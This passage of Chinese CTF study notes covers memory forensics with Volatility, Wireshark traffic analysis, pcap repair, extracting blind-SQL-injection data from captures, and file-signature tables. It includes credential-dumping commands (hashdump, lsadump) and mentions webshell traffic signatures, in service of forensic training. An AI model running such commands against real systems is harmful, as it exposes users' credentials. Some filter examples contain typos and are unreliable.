查找带有隐藏进程的所有进程列表<br>qemuinfo    转储 Qemu 信息<br>raw2dmp    	将物理内存原生数据转换为windbg崩溃转储格式<br>screenshot   基于GDI Windows的虚拟屏幕截图保存<br>servicediff  	Windows服务列表(ala Plugx)<br>sessions    _MM_SESSION_SPACE的详细信息列表(用户登录会话)<br>shellbags   	打印Shellbags信息<br>shimcache   	解析应用程序兼容性Shim缓存注册表项<br>shutdowntime  从内存中的注册表信息获取机器关机时间<br>sockets    	打印已打开套接字列表<br>sockscan    TCP套接字对象池扫描<br>ssdt      显示SSDT条目<br>strings    	物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)<br>svcscan    	Windows服务列表扫描<br>symlinkscan  	符号链接对象池扫描<br>thrdscan    线程对象池扫描<br>threads    	调查_ETHREAD 和_KTHREADs<br>timeliner   	创建内存中的各种痕迹信息的时间线<br>timers     打印内核计时器及关联模块的DPC<br>truecryptmaster	Recover 恢复TrueCrypt 7.1a主密钥<br>truecryptpassphrase		查找并提取TrueCrypt密码<br>truecryptsummary	TrueCrypt摘要信息<br>unloadedmodules	打印卸载的模块信息列表<br>userassist   打印注册表中UserAssist相关信息<br>userhandles  	转储用户句柄表<br>vaddump    	转储VAD数据为文件<br>vadinfo    	转储VAD信息<br>vadtree    	以树形方式显示VAD树信息<br>vadwalk    	显示遍历VAD树<br>vboxinfo    转储Virtualbox信息（虚拟机）<br>verinfo    	打印PE镜像中的版本信息<br>vmwareinfo   转储VMware VMSS&#x2F;VMSN 信息<br>volshell    内存镜像中的shell<br>windows    	打印桌面窗口(详细信息)<br>wintree    	Z顺序打印桌面窗口树<br>wndscan    	池扫描窗口站<br>yarascan    以Yara签名扫描进程或内核内存</p>
<h5 id="1-例子（忘了是哪个比赛的题目了）"><a href="#1-例子（忘了是哪个比赛的题目了）" class="headerlink" title="1.例子（忘了是哪个比赛的题目了）"></a>1.例子（忘了是哪个比赛的题目了）</h5><p>你作为 A 公司的应急响应人员，请分析提供的内存文件按照下面的要求找到 相关关键信息，完成应急响应事件。</p>
<p>1、从内存中获取到用户admin的密码并且破解密码，以Flag{admin,password} 形式提交(密码为 6 位)；   </p>
<p>2、获取当前系统 ip 地址及主机名，以 Flag{ip:主机名}形式提交；</p>
<p>3、获取当前系统浏览器搜索过的关键词，作为 Flag 提交；</p>
<p>4、当前系统中存在挖矿进程，请获取指向的矿池地址，以 Flag{ip:端口}形式 提交；</p>
<p>5、恶意进程在系统中注册了服务，请将服务名以 Flag{服务名}形式提交。</p>
<p>上题已经看到进程</p>
<p>解析<br> 1.从内存中获取到用户admin的密码并且破解密码，以Flag{admin,password} 形式提交(密码为 6 位)；<br>      不管什么题内存取证的第一步肯定是去判断当前的镜像信息，分析出是哪个操作系统   使用参数  imageinfo 查看系统信息</p>
<pre><code>  volatility -f 1.vmem imageinfo
</code></pre>
<p>操作系统我们一般取第一个就可以了</p>
<p>接下来就可以输入参数</p>
<p>可以先查看当前内存镜像中的用户</p>
<p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 printkey -K “SAM\Domains\Account\Users\Names”</p>
<p> 使用hashdump获取sam</p>
<p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 hashdump</p>
<p> 可以通过john工具来进行爆破，但是好像跑不出来结果。应该是设定了强密码。于是只能使用了lasdump命令来查看</p>
<p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 lsadump</p>
<p>  flag{admin.dfsddew}</p>
<p>2.获取当前系统 ip 地址及主机名，以 Flag{ip:主机名}形式提交；<br> Netscan 可以查ip</p>
<p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 netscan</p>
<p> Ip:192.168.85.129</p>
<p>主机名需要通过查询注册表，先用hivelist</p>
<p>Volatility -f  1.vmem –profile&#x3D;Win7SP1x64 hivelist</p>
<p> 然后我们需要一步一步去找键名</p>
<p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 -o 0xfffff8a000024010 printkey</p>
<p> volatility -f 1.vmem –profile&#x3D;Win7SP1x64 -o 0xfffff8a000024010 printkey -K “ControlSet001”</p>
<p>继续</p>
<p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64  -o 0xfffff8a000024010 printkey -K “ControlSet001\Control “</p>
<p>继续</p>
<p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 -o 0xfffff8a000024010 printkey -K “ControlSet001\Control\ComputerName”</p>
<p>再来</p>
<p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 -o 0xfffff8a000024010 printkey -K “ControlSet001\Control\ComputerName\ComputerName”</p>
<p>得到主机名WIN-9FBAEH4UV8C</p>
<p>也可以直接通过 hivedump查询相应的键名 但比较慢</p>
<p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 hivedump -o 0xfffff8a000024010 &gt; system.txt</p>
<p>3.获取当前系统浏览器搜索过的关键词，作为 Flag 提交；<br>这里使用iehistory</p>
<p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 iehistory</p>
<p>  flag{admin@file:&#x2F;&#x2F;&#x2F;C:&#x2F;Users&#x2F;admin&#x2F;Desktop&#x2F;flag.txt}</p>
<p>4.当前系统中存在挖矿进程，请获取指向的矿池地址，以 Flag{ip:端口}形式 提交；<br>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 netscan </p>
<p>唯一一个已建立的</p>
<p>  flag{54.36.109.161:2222}</p>
<p>5.恶意进程在系统中注册了服务，请将服务名以 Flag{服务名}形式提交。<br>上一题中已经知道了进程号为2588</p>
<p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 pslist -p 2588</p>
<p>查到父进程是3036</p>
<p>然后在通过通过svcscan可以查询服务名称，找到对应服务名</p>
<p>volatility -f 1.vmem –profile&#x3D;Win7SP1x64 svcscan</p>
<p> flag{VMnetDHCP}</p>
<h3 id="wireshark的使用"><a href="#wireshark的使用" class="headerlink" title="wireshark的使用"></a>wireshark的使用</h3><p>1.使用wireshark进行抓包，学会用混淆模式抓包</p>
<p>2.（1）过滤器使用时 过滤arp udp tcp dns http等协议时要输入小写字母进行过滤</p>
<p>​    （2）对ip进行过滤：ip.src_host &#x3D;&#x3D; 192.168.1.53 表示源 IP 地址 </p>
<p>​                                         ip.dst_host &#x3D;&#x3D; 192.168.1.1 表示目的地址</p>
<p>​    （3）or和and的使用</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">基于名称的HTTP显示过滤器</span><br><span class="line">1、让wireshark只显示访问某指定域名（www.bt2bn.cn)的HTTP请求数据包：http.host == “www.bt2bn.cn”.</span><br><span class="line"></span><br><span class="line">2、让wireshark只显示访问包含了指定字符串的域名（比如，包含bt2bn的域名）的HTTP请求数据包：http.host contains “bt2bn”.</span><br><span class="line"></span><br><span class="line">3、让wireshark只显示Referer头部内容为“http://www.bt2bn.cn/“的HTTP请求数据包：http.referer == “http://www.bt2bn.cn/”</span><br><span class="line"></span><br><span class="line">基于HTTP请求方法的显示过滤器</span><br><span class="line">1、要让wireshark显示包含GET请求的所有HTTP数据包，显示过滤器的写法为:http.request.method == GET。</span><br><span class="line"></span><br><span class="line">2、要让Wireshark显示所有HTTP请求数据包，显示过滤器的写法为:http.request。</span><br><span class="line"></span><br><span class="line">3、要让Wireshark显示所有HTTP响应数据包，显示过滤器的写法为:http.response。</span><br><span class="line"></span><br><span class="line">4、要让Wireshark显示包含所有HTTP数据包，但包含GET方法的HTTP请求数据包除外，显示过滤器的写法为:http.request and not http.request.method == GET。</span><br><span class="line"></span><br><span class="line">基于HTTP状态码的显示过滤器</span><br><span class="line">1、要让Wireshark显示包含HTTP错误状态码的HTTP响应数据包:http.request.code &gt;= 400。</span><br><span class="line"></span><br><span class="line">2、要让Wireshark只显示包含HTTP客户端错误状态码的HTTP响应数据包:http.response.code &gt;=400 and http.response.code &lt;= 499。</span><br><span class="line"></span><br><span class="line">3、要让Wireshark只显示包含HTTP服务器端错误状态码的HTTP响应数据包:http.response.code &lt;=599。</span><br><span class="line"></span><br><span class="line">4、要让Wireshark只显示状态码为404的HTTP响应数据包:http.response.code == 404。</span><br><span class="line"></span><br><span class="line">5、过滤所有的http响应包：http.response==1</span><br><span class="line"></span><br><span class="line">6、过滤所有的http请求，貌似也可以使用http.request：http.request==1</span><br><span class="line"></span><br><span class="line">7、wireshark过滤所有请求方式为POST的http请求包，注意POST为大写：http.request.method==POST</span><br><span class="line"></span><br><span class="line">8、过滤含有指定cookie的http数据包：http.cookie contains guid</span><br><span class="line"></span><br><span class="line">9、过滤请求的uri，取值是域名后的部分：http.request.uri==”/online/setpoint”</span><br><span class="line"></span><br><span class="line">10、过滤含域名的整个url则需要使用http.request.full_uri：http.request.full_uri==” http://task.browser.360.cn/online/setpoint”</span><br><span class="line"></span><br><span class="line">11、过滤http头中server字段含有nginx字符的数据包：http.server contains “nginx”</span><br><span class="line"></span><br><span class="line">12、过滤content_type是text/html的http响应、post包，即根据文件类型过滤http数据包：http.content_type == “text/html”</span><br><span class="line"></span><br><span class="line">13、过滤content_encoding是gzip的http包：http.content_encoding == “gzip”</span><br><span class="line"></span><br><span class="line">14、根据transfer_encoding过滤：http.transfer_encoding == “chunked”</span><br><span class="line"></span><br><span class="line">15、根据content_length的数值过滤：http.content_length == 279 或 http.content_length_header == “279″</span><br><span class="line"></span><br><span class="line">16、过滤所有含有http头中含有server字段的数据包：http.server</span><br><span class="line"></span><br><span class="line">17、过滤HTTP/1.1版本的http包，包括请求和响应：http.request.version == “HTTP/1.1″</span><br><span class="line"></span><br><span class="line">18、过滤http响应中的phrase：http.response.phrase == “OK”</span><br><span class="line"></span><br><span class="line">19、显示前1000个数据包：fream.number &lt;= 1000</span><br><span class="line"></span><br><span class="line">20、显示序列号10-20内的数据包：fream.number &lt;= 10 and fream.number &lt;= 20</span><br></pre></td></tr></table></figure>

<p>​       我们中间用 or 进行了拼接，表示或 当然我们也可以使用 and 表示与，or 表示满足左右其中一个条 件就会显示符合条件的数据包，and 表示左右 2 个条件都满足才会显示</p>
<p>3.常用协议分析。</p>
<p>​    icmp,http,tcp,dns</p>
<h4 id="常见流量分析题目"><a href="#常见流量分析题目" class="headerlink" title="常见流量分析题目"></a>常见流量分析题目</h4><h5 id="1-直接搜flag-flag明文"><a href="#1-直接搜flag-flag明文" class="headerlink" title="1.  直接搜flag(flag明文)"></a>1.  直接搜flag(flag明文)</h5><h5 id="2-flag-编码"><a href="#2-flag-编码" class="headerlink" title="2.flag(编码)"></a>2.flag(编码)</h5><p>flag十六进制：666c6167</p>
<p>asiic转Unicode：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#102;&amp;#108;&amp;#97;&amp;#103;</span><br></pre></td></tr></table></figure>

<p>base64:   Zmxh</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印可打印字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_re</span>(<span class="params">str1</span>):</span><br><span class="line">    str2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1.decode(<span class="string">&#x27;utf8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># print(ord(i))</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i) &lt;= <span class="number">126</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i) &gt;= <span class="number">33</span>:</span><br><span class="line">                str2 += i</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            str2 += <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment"># print(str2)</span></span><br><span class="line">    <span class="keyword">return</span> str2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入文本函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">txt_wt</span>(<span class="params">name, txt1</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&#x27;filename:&#x27;</span> + name)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;flag:&#x27;</span> + txt1)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次运行，清空output文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_txt</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;clear output.txt！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 递归遍历的所有文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_bianli</span>():</span><br><span class="line">    <span class="comment"># 路径设置为当前目录</span></span><br><span class="line">    path = os.getcwd()</span><br><span class="line">    <span class="comment"># 返回文件下的所有文件列表</span></span><br><span class="line">    file_list = []</span><br><span class="line">    <span class="keyword">for</span> i, j, k <span class="keyword">in</span> os.walk(path):</span><br><span class="line">        <span class="keyword">for</span> dd <span class="keyword">in</span> k:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;.py&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> dd <span class="keyword">and</span> <span class="string">&quot;output.txt&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> dd:</span><br><span class="line">                file_list.append(os.path.join(i, dd))</span><br><span class="line">    <span class="keyword">return</span> file_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找文件中可能为flag的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">file_list, flag</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> file_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(i, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> f.readlines():</span><br><span class="line">                    j1 = str_re(j)  <span class="comment"># 可打印字符串</span></span><br><span class="line">                    <span class="comment"># print j1</span></span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> flag:</span><br><span class="line">                        <span class="keyword">if</span> k <span class="keyword">in</span> j1:</span><br><span class="line">                            txt_wt(i, j1)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&#x27;filename:&#x27;</span>, i)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&#x27;flag:&#x27;</span>, j1)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;err&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里可以自行添加一些flag编码后的形式</span></span><br><span class="line">flag_txt = [<span class="string">&#x27;flag&#123;&#x27;</span>, <span class="string">&#x27;666c6167&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;Zmxh&#x27;</span>, <span class="string">&#x27;&amp;#102&#x27;</span>, <span class="string">&#x27;666C6167&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空输出的文本文件</span></span><br><span class="line">clear_txt()</span><br><span class="line"><span class="comment"># 遍历文件名</span></span><br><span class="line">file_lt = file_bianli()</span><br><span class="line"><span class="comment"># 查找flag关键字</span></span><br><span class="line">flag(file_lt, flag_txt)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="3-压缩包"><a href="#3-压缩包" class="headerlink" title="3.压缩包"></a>3.压缩包</h5><p>找到压缩包对应的字节流</p>
<p>红色就是发送包，蓝色就是返回包</p>
<p>菜刀流量的一个特征应该是有 X@Y</p>
<h5 id="4、不可打印字符-telnet协议"><a href="#4、不可打印字符-telnet协议" class="headerlink" title="4、不可打印字符(telnet协议)"></a>4、不可打印字符(telnet协议)</h5><h5 id="5-蓝牙协议"><a href="#5-蓝牙协议" class="headerlink" title="5.蓝牙协议"></a>5.蓝牙协议</h5><h5 id="6-usb键盘鼠标流量"><a href="#6-usb键盘鼠标流量" class="headerlink" title="6.usb键盘鼠标流量"></a>6.usb键盘鼠标流量</h5><h5 id="7-无线流量"><a href="#7-无线流量" class="headerlink" title="7.无线流量"></a>7.无线流量</h5><h5 id="8-流量包修复"><a href="#8-流量包修复" class="headerlink" title="8.流量包修复"></a>8.流量包修复</h5><blockquote>
<p>题目：第一届 “百度杯” 信息安全攻防总决赛 线上选拔赛：find the flag</p>
<p>WP：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ECJTUACM-873284962/p/9884447.html">https://www.cnblogs.com/ECJTUACM-873284962/p/9884447.html</a></p>
</blockquote>
<p>首先我们拿到这样一道流量包的题目，题目名称为 <code>find the flag</code> 。这里面给了很多提示信息，要我们去找到 <code>flag</code> 。</p>
<p><strong>第一步，搜索 <code>flag</code> 字样</strong></p>
<p>我们先去搜索看看流量包里面有没有 <code>flag</code> 。我们使用 <code>strings</code> 命令去找一下流量包， <code>Windows</code> 的朋友可以用 <code>notepad++</code> 的搜索功能去寻找。</p>
<p>搜索命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings findtheflag.cap | grep flag</span><br></pre></td></tr></table></figure>

<p>搜索结果如下：</p>
<p>我们发现搜出了一大堆的东西，我们通过管道去过滤出 <code>flag</code> 信息，似乎没有发现我们所需要找的答案。</p>
<p><strong>第二步，流量包修复</strong></p>
<p>我们用 <code>wireshark</code> 打开这个流量包</p>
<p><img src="https://ctf-wiki.org/misc/traffic/figure/wireshark-to-error.png" alt="wireshark-to-error"></p>
<p>我们发现这个流量包出现了异常现象，我们可以修复一下这个流量包。</p>
<p>这里我们用到一个在线工具：<a target="_blank" rel="noopener" href="http://f00l.de/hacking/pcapfix.php">http://f00l.de/hacking/pcapfix.php</a></p>
<p>这个工具可以帮助我们快速地将其流量包修复为 <code>pcap</code> 包。</p>
<p>我们对其进行在线修复。</p>
<p><img src="https://ctf-wiki.org/misc/traffic/figure/repaire-to-pcap.png" alt="repaire-to-pcap"></p>
<p>修复完毕后点击 <code>Get your repaired PCAP-file here.</code> 即可下载流量包，然后我们用 <code>wireshark</code> 打开。</p>
<p>既然还是要找 <code>flag</code> ，我们可以先看看这个流量包。</p>
<p><strong>第三步，追踪 TCP 流</strong></p>
<p>我们追踪一下 TCP 流，看看有没有什么突破？</p>
<p><img src="https://ctf-wiki.org/misc/traffic/figure/wireshark-to-stream.png" alt="wireshark-to-stream"></p>
<p>我们通过追踪 <code>TCP</code> 流，可以看到一些版本信息， <code>cookie</code> 等等，我们还是发现了一些很有意思的东西。</p>
<p>从 <code>tcp.stream eq 29</code> 到 <code>tcp.stream eq 41</code> 只显示了 <code>where is the flag?</code> 这个字样，难道这是出题人在告诉我们 <code>flag</code> 在这里嘛？</p>
<p><strong>第四步，查找分组字节流</strong></p>
<p>我们追踪到 <code>tcp.stream eq 29</code> 的时候，在 <code>Identification</code> 信息中看到了 <code>flag</code> 中的 <code>lf</code> 字样，我们可以继续追踪下一个流，在 <code>tcp.stream eq 30</code> 的 <code>Identification</code> 信息中看到了 <code>flag</code> 中的 <code>ga</code> 字样，我们发现将两个包中 <code>Identification</code> 信息对应的字段从右至左组合，恰好就是 <code>flag</code> ！于是我们可以大胆地猜测， <code>flag</code> 肯定是藏在这里面。</p>
<p>我们直接通过搜索 -&gt; 字符串搜索 -&gt; 分组字节流 -&gt; 搜索关键字 <code>flag</code> 即可，按照同样的方式连接后面相连数据包的 <code>Identification</code> 信息对应的字段，即可找到最终的 flag！</p>
<p>下面是搜索的截图：</p>
<p>所以最终的 <code>flag</code> 为：<strong>flag{aha!_you_found_it!}</strong></p>
<h5 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h5><p>提取数据</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r hack.pcap -T fields -e http.request.full_uri|<span class="built_in">tr</span> -s <span class="string">&#x27;\n&#x27;</span>|grep flag &gt; <span class="built_in">log</span></span><br></pre></td></tr></table></figure>

<p>处理数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;log&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    tmp = f.read()</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    data = re.findall(<span class="string">r&#x27;=(\d*)%23&#x27;</span>,tmp)</span><br><span class="line">    data = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    <span class="keyword">for</span> i,num <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> num &gt; data[i+<span class="number">1</span>]:</span><br><span class="line">                flag += <span class="built_in">chr</span>(num)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>



<h3 id="一、文件头文件尾"><a href="#一、文件头文件尾" class="headerlink" title="一、文件头文件尾"></a><strong>一、文件头文件尾</strong></h3><h5 id="1、图片"><a href="#1、图片" class="headerlink" title="1、图片"></a><strong>1、图片</strong></h5><ul>
<li>JPEG 文件头：<code>FF D8 FF</code>  文件尾：<code>FF D9</code></li>
<li>TGA 未压缩的前4字节 <code>00 00 02 00</code> RLE压缩的前5字节 <code>00 00 10 00 00</code></li>
<li>PNG 文件头：<code>89 50 4E 47 0D 0A 1A 0A</code>  文件尾：<code>AE 42 60 82</code></li>
<li>GIF 文件头：<code>47 49 46 38 39(37) 61</code>  文件尾：<code>00 3B</code></li>
<li>BMP 文件头：<code>42 4D</code> 文件头标识(2 bytes) 42(B) 4D(M)</li>
<li>TIFF (tif) 文件头：<code>49 49 2A 00</code></li>
<li>ico 文件头：<code>00 00 01 00</code></li>
<li>Adobe Photoshop (psd) 文件头：<code>38 42 50 53</code></li>
</ul>
<h5 id="2、office文件"><a href="#2、office文件" class="headerlink" title="2、office文件"></a><strong>2、office文件</strong></h5><ul>
<li>MS Word&#x2F;Excel (xls.or.doc) 文件头：<code>D0 CF 11 E0</code></li>
<li>MS Access (mdb) 文件头：<code>53 74 61 6E 64 61 72 64 20 4A</code></li>
<li>WordPerfect (wpd) 文件头：<code>FF 57 50 43</code></li>
<li>Adobe Acrobat (pdf) 文件头：<code>25 50 44 46 2D 31 2E</code></li>
<li>application&#x2F;vnd.visio(vsd) 文件头：<code>D0 CF 11 E0 A1 B1 1A E1</code></li>
<li>Email [thorough only] (eml) 文件头：<code>44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A</code></li>
<li>Outlook Express (dbx) 文件头：<code>CF AD 12 FE C5 FD 74 6F</code></li>
<li>Outlook (pst) 文件头：<code>21 42 44 4E</code></li>
<li>Rich Text Format (rtf) 文件头：<code>7B 5C 72 74 66</code></li>
<li>txt 文件(txt) 文件头：Unicode：<code>FE FF</code> &#x2F; Unicode big endian：<code>FF FE</code> &#x2F; UTF-8：<code>EF BB BF</code> &#x2F;ANSI编码是没有文件头的</li>
</ul>
<h5 id="3、压缩包文件"><a href="#3、压缩包文件" class="headerlink" title="3、压缩包文件"></a><strong>3、压缩包文件</strong></h5><ul>
<li>ZIP Archive (zip) 文件头：<code>50 4B 03 04</code> 文件尾：<code>50 4B</code></li>
<li>RAR Archive (rar) 文件头：<code>52 61 72 21</code></li>
</ul>
<h5 id="4、音频文件"><a href="#4、音频文件" class="headerlink" title="4、音频文件"></a><strong>4、音频文件</strong></h5><ul>
<li>Wave (wav) 文件头：<code>57 41 56 45</code></li>
<li>audio(Audio) 文件头： <code>4D 54 68 64</code></li>
<li>audio&#x2F;x-aac（aac）</li>
<li>文件头：<code>FF F1(9)</code></li>
</ul>
<h5 id="5、视频文件"><a href="#5、视频文件" class="headerlink" title="5、视频文件"></a><strong>5、视频文件</strong></h5><ul>
<li>AVI (avi) 文件头：<code>41 56 49 20</code></li>
<li>Real Audio (ram) 文件头：<code>2E 72 61 FD</code></li>
<li>Real Media (rm) 文件头：<code>2E 52 4D 46</code></li>
<li>MPEG (mpg) 文件头：<code>00 00 01 BA(3)</code></li>
<li>Quicktime (mov) 文件头：<code>6D 6F 6F 76</code></li>
<li>Windows Media (asf) 文件头：<code>30 26 B2 75 8E 66 CF 11</code></li>
<li>MIDI (mid) 文件头：<code>4D 54 68 64</code></li>
</ul>
<h5 id="6、代码文件"><a href="#6、代码文件" class="headerlink" title="6、代码文件"></a><strong>6、代码文件</strong></h5><ul>
<li>XML (xml) 文件头：<code>3C 3F 78 6D 6C</code></li>
<li>HTML (html) 文件头：<code>68 74 6D 6C 3E</code></li>
<li>Quicken (qdf) 文件头：<code>AC 9E BD 8F</code></li>
<li>Windows Password (pwl) 文件头：<code>E3 82 85 96</code></li>
</ul>
<h5 id="7、其他类型"><a href="#7、其他类型" class="headerlink" title="7、其他类型"></a><strong>7、其他类型</strong></h5><ul>
<li>windows证书文件(der) 文件头：<code>30 82 03 C9</code></li>
<li>CAD (dwg) 文件头：<code>41 43 31 30</code></li>
<li>Windows Shortcut (lnk) 文件头：<code>4C 00 00 00</code></li>
<li>Windows reg(reg) 文件头：<code>52 45 47 45 44 49 54 34</code></li>
</ul>
